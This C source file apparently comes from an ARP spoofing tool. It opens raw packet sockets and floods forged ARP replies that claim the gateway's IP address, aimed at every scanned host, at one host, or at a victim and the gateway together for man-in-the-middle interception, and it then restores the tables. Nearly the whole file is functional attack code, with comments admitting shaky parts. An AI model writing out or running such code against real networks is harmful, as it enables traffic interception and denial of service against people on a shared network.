#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netdb.h>
#include <linux/if_arp.h>
#include <pthread.h>
#include <time.h>

# include "struct.h"
# include "define.h"
# include "utils.h"

extern int g_stop;

static SOCKET initiate_socket_for_arp(const char ifacename[IFNAMSIZ])
{
	SOCKET iface = 0;

	iface = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (iface == -1)
		goto err;
	if (setsockopt(iface, SOL_SOCKET, SO_BINDTODEVICE, ifacename, strlen(ifacename)) == -1)
		goto err;

	return iface;
err:
	if (iface > 0) {
		close(iface);
		ERROR_SOCKET_MODIFY_DENIED(ifacename);
	}
	else
		ERROR_SOCKET_DENIED();
	return(-1);	
}

typedef struct arpthreadinfo
{
	SOCKET iface;
	const struct arguments *arguments;
	nmap_r *target;
}	arpthreadinfo;

static void *arpthread(void *argp)
{
	struct arpthreadinfo *arg = argp;
	const struct arguments *arguments = arg->arguments;
	nmap_r *target = arg->target;
	SOCKET iface = arg->iface;
	struct timespec start = {0x0}, stop = { 0x0 }, time_to_sleep = { 0x0 };
	uint64_t time_to_wait = 0;
	unsigned char payload[42] = { 0x0 };
	eth *eth_hdr = (eth*)payload;
	arp *arp_hdr = (arp*)(payload + ETH_HLEN);
	struct sockaddr_ll ifaceinfo = { 0x0 };
	// socklen_t ifaceinfolen;
	size_t rlen;

	if (arguments->ppm != 0)
	{
		time_to_wait = 60;
		time_to_wait *= 1000000000;
		time_to_wait /= arguments->ppm;
	}
	time_to_sleep.tv_nsec = 10; // 10 nanoseconds

	copy_mac(eth_hdr->dest_addr, target->ha);	/* 6 bytes dest addr */
	copy_mac(eth_hdr->src_addr, arguments->self_ha);	/* 6 bytes src addr (us) */
	eth_hdr->eth_type = htons(ETH_P_ARP);	/* arp request htons(0x0806) */
	arp_hdr->htype = htons(0x1);	/* hardware type htons(0x1) */ // not sure about this
	arp_hdr->ptype = htons(0x0800);	/* protocol type htons(0x0800) */ // nor this
	arp_hdr->hlen = ETH_ALEN; /* hardware addr len 6 */
	arp_hdr->plen = IPV4_LEN; /* proto addr len 4 */
	arp_hdr->operation = htons(0x2);	/* response arp type */
	copy_mac(arp_hdr->sender_ha, arguments->self_ha);	/* mac to spoof */
	copy_ipv4(arp_hdr->sender_pa, arguments->gateway_pa);	/* ip to spoof */
	copy_mac(arp_hdr->target_ha, target->ha);	/* target ha we send the response to, (unused) */
	copy_ipv4(arp_hdr->target_pa, target->pa);	/* target pa we send the response to, (unused) */

	ifaceinfo.sll_family = AF_PACKET;
	ifaceinfo.sll_protocol = htons(ETH_P_ARP);
	ifaceinfo.sll_ifindex = if_nametoindex(arguments->ifacename); // ???????????
	ifaceinfo.sll_hatype = htons(ARPHRD_ETHER);
	ifaceinfo.sll_pkttype = (0);
	ifaceinfo.sll_halen = ETH_ALEN;
	ifaceinfo.sll_addr[6] = 0x00;
	ifaceinfo.sll_addr[7] = 0x00;

	TELLNUKINGTARGET(target->pa, arguments->gateway_pa, arguments->self_ha);

	// not initialiszing the structure allow us to send a reply packet the 1st time we enter the loop
	while (g_stop == 1) {
		clock_gettime(CLOCK_REALTIME, &stop);
		uint64_t t = (stop.tv_sec - start.tv_sec); // rename the var
		t *= 1000000000;
		t += stop.tv_nsec - start.tv_nsec;
		if (t > time_to_wait)
		{
			rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfo, sizeof(ifaceinfo));
			if (rlen != ETH_HLEN + ARP_HLEN)
				{ ERROR_SEND(); goto err; }
			clock_gettime(CLOCK_REALTIME, &start);
		}
		if (time_to_wait != 0)
			nanosleep(&time_to_sleep, NULL);
	}
	return NULL;
err:
	return NULL;
}

int start_attack_all(const struct arguments *arguments, nmap_r **scan)
{
	SOCKET iface = -1;
	pthread_t *thread = NULL;
	struct arpthreadinfo **argp;

	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
		goto err;
	TELLSOCKETSUCCESS(arguments->ifacename);

	/* malloc each thread and its arguments */
	if (!(thread = malloc((arguments->scanamount - 2) * sizeof(thread))))
		{ ERROR_MALLOC(); goto err; }
	if (!(argp = malloc((arguments->scanamount - 2) * sizeof(arpthreadinfo*))))
		{ ERROR_MALLOC(); goto err; }
	start_signal();

	/* setup thread arguments and start it if its not the gateway or us */
	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
		if (scan[i]->gateway == 0 && scan[i]->self == 0) {
			if (!(argp[j] = malloc(sizeof(arpthreadinfo))))
				{ ERROR_MALLOC(); goto err; }
			argp[j]->iface = iface;
			argp[j]->arguments = arguments;
			argp[j]->target = scan[i];
			pthread_create(&thread[j], NULL, arpthread, argp[j]);
			++j;
		}
	}
	/* wait for thread to finish */
	for (size_t j = 0; j < arguments->scanamount - 2; ++j) {
		if (scan[j]->gateway == 0 && scan[j]->self == 0) {
			pthread_join(thread[j], NULL);
			free(argp[j]);
		}
	}
	stop_signal();
	g_stop = 1;
	free(thread);
	free(argp);

	TELLSTOPATTACK();

	close(iface);
	return 0;
err:
	if (iface != -1)
		close(iface);
	return -1;
}

int start_attack_one(const struct arguments *arguments, nmap_r *target)
{
	SOCKET iface = -1;
	pthread_t thread;
	struct arpthreadinfo argp;

	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
		goto err;
	TELLSOCKETSUCCESS(arguments->ifacename);

	argp.iface = iface;
	argp.arguments = arguments;
	argp.target = target;

	start_signal();
	pthread_create(&thread, NULL, arpthread, &argp);
	pthread_join(thread, NULL);
	stop_signal();
	g_stop = 1;
	TELLSTOPATTACK();

	close(iface);
	return 0;
err:
	if (iface != -1)
		close(iface);
	return -1;
}

int arpspoof(const struct arguments *arguments, nmap_r **scan, long long victimidx)
{
	SOCKET arpsock = -1;
	struct arguments argvictim, arggateway;
	pthread_t threadvictim, threadgateway;
	struct arpthreadinfo threadinfovictim, threadinfogateway;

	if ((arpsock = initiate_socket_for_arp(arguments->ifacename)) == -1)
		goto err;
	TELLSOCKETSUCCESS(arguments->ifacename);

	memcpy(&argvictim, arguments, sizeof(struct arguments));
	memcpy(&arggateway, arguments, sizeof(struct arguments));

	threadinfovictim.iface = arpsock;
	threadinfogateway.iface = arpsock;

	threadinfovictim.arguments = &argvictim;
	threadinfogateway.arguments = &arggateway;

	threadinfovictim.target = scan[victimidx];
	threadinfogateway.target = get_gateway_from_scan(scan); // may segfault later on idk

	// ultra hackish
	copy_ipv4(arggateway.gateway_pa, scan[victimidx]->pa);

	start_signal();
	pthread_create(&threadvictim, NULL, arpthread, &threadinfovictim);
	pthread_create(&threadgateway, NULL, arpthread, &threadinfogateway);

	pthread_join(threadvictim, NULL);
	pthread_join(threadgateway, NULL);
	g_stop = 1;

	TELLRESTORINGMAC();

	memcpy(&argvictim, arguments, sizeof(struct arguments));
	memcpy(&arggateway, arguments, sizeof(struct arguments));

	/*
	** very sketchy, arpthread() is using self_ha as the mac to spoof,
	** since we want to restore the arp table we need to put the REAL
	** gateway HA as self HA
	*/
	copy_mac(argvictim.self_ha, arguments->gateway_ha);

	copy_ipv4(arggateway.gateway_pa, scan[victimidx]->pa);
	copy_mac(arggateway.self_ha, scan[victimidx]->ha);

	pthread_create(&threadvictim, NULL, arpthread, &threadinfovictim);
	pthread_create(&threadgateway, NULL, arpthread, &threadinfogateway);

	pthread_join(threadvictim, NULL);
	pthread_join(threadgateway, NULL);

	stop_signal();
	g_stop = 1;
	TELLSTOPATTACK();

	close(arpsock);
	return 0;
err:
	if (arpsock != -1)
		close(arpsock);
	return -1;
}
